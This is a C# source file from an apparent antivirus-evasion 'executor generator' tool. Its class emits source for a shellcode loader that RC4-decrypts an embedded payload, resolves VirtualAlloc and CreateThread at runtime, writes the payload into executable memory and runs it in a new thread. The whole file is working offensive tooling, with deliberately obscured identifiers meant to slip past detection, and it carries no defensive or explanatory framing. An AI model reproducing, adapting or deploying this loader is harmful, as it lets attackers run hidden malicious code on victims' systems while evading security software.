using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_VirtualAlloc_DLL
    {
        string code;
        public TP_VirtualAlloc_DLL(String decKey, String encPayload)
        {
            code = @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;


[ComVisible(true)]
public class TestClass
{
    internal static class UnsafeNativeMethods
    {
        [DllImport(""Kernel32"")]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
        [DllImport(""Kernel32"")]
        internal static extern IntPtr LoadLibraryA(string moduleName);
    }
    internal delegate UInt32 VirtualAllocInvoker(
        UInt32 lpStartAddr,
        UInt32 size,
        UInt32 flAllocationType,
        UInt32 flProtect);

    internal delegate IntPtr CreateThreadInvoker(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId);

    internal delegate UInt32 WaitForSingleObjectInvoker(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );

    public static byte[] xxxxxx(byte[] key, byte[] data)
    {
        return xxxxxxx(key, data).ToArray();
    }

    private static byte[] sDZi32(byte[] key)
    {
        byte[] s = Enumerable.Range(0, 256)
            .Select(i => (byte)i)
            .ToArray();

        for (int i = 0, j = 0; i < 256; i++)
        {
            j = (j + key[i % key.Length] + s[i]) & 255;

            xxx(s, i, j);
        }

        return s;
    }
    private static IEnumerable<byte> xxxxxxx(byte[] key, IEnumerable<byte> data)
    {
        byte[] s = sDZi32(key);

        int i = 0;
        int j = 0;

        return data.Select((b) =>
        {
            i = (i + 1) & 255;
            j = (j + s[i]) & 255;

            xxx(s, i, j);

            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
        });
    }
    private static void xxx(byte[] s, int i, int j)
    {
        byte c = s[i];

        s[i] = s[j];
        s[j] = c;
    }

    public TestClass()
    {
        string xxxx = """+ encPayload +@""";
        string[] xxxx_Without_delimiterChar = xxxx.Split(',');
        byte[] _X_to_Bytes = new byte[xxxx_Without_delimiterChar.Length];
        for (int i = 0; i < xxxx_Without_delimiterChar.Length; i++)
        {
            byte current = Convert.ToByte(xxxx_Without_delimiterChar[i].ToString());
            _X_to_Bytes[i] = current;
        }
        byte[] KEY = { "+ decKey +@" };
        byte[] xxxxx = xxxxxx(KEY, _X_to_Bytes);

        IntPtr fptrva = UnsafeNativeMethods.GetProcAddress(UnsafeNativeMethods.LoadLibraryA(""Kernel32""), ""VirtualAlloc"");
        VirtualAllocInvoker va =
            (VirtualAllocInvoker)Marshal.GetDelegateForFunctionPointer(fptrva, typeof(VirtualAllocInvoker));

        IntPtr fptrct = UnsafeNativeMethods.GetProcAddress(UnsafeNativeMethods.LoadLibraryA(""Kernel32""), ""CreateThread"");

        IntPtr fptrwf = UnsafeNativeMethods.GetProcAddress(UnsafeNativeMethods.LoadLibraryA(""Kernel32""), ""WaitForSingleObject"");

        CreateThreadInvoker ct = (CreateThreadInvoker)Marshal.GetDelegateForFunctionPointer(fptrct, typeof(CreateThreadInvoker));

        WaitForSingleObjectInvoker wf = (WaitForSingleObjectInvoker)Marshal.GetDelegateForFunctionPointer(fptrwf, typeof(WaitForSingleObjectInvoker));

        UInt32 a = va(0, (UInt32)xxxxx.Length, 0x1000, 0x40);
        Marshal.Copy(xxxxx, 0, (IntPtr)(a), xxxxx.Length);

        IntPtr hThread = IntPtr.Zero;

        UInt32 threadId = 0;

        IntPtr pinfo = IntPtr.Zero;

        hThread = ct(0, 0, a, pinfo, 0, ref threadId);

        wf(hThread, 0xFFFFFFFF);
    }
}
";
        }

        public string GetCode()
        {
            return code;
        }
    }
}
